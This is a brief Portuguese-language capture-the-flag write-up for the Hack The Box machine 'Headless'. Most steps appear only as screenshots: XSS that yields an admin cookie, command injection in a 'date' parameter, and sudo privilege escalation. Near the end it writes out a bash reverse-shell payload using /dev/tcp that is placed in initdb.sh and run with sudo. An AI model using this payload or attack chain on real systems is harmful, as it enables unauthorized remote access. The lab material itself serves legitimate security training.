Enumeração de serviços:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404080458.png]]

Descoberta de diretórios:

![[Write-up/Hack The Box/Headless/img/Pasted image 20240404084402.png]]

Validação de XSS:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404085019.png]]

Recebemos cookie do admin:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404085044.png]]

Execução de RCE no parâmetro date:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404085330.png]]

Shell reversa:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404085605.png]]

Email enviado ao usuário atual, falando sobre o novo script:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404091413.png]]

Verificação do código do novo script:
![[Write-up/Hack The Box/Headless/img/Pasted image 20240404091503.png]]

Podemos criar o arquivo initdb.sh com o payload da shell reversa:
``` bash
#LOCAL
bash -i

#REMOTO
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

Dê permissão de execução ao arquivo:
```bash
chmod +x initdb.sh
```

E execute o script com sudo.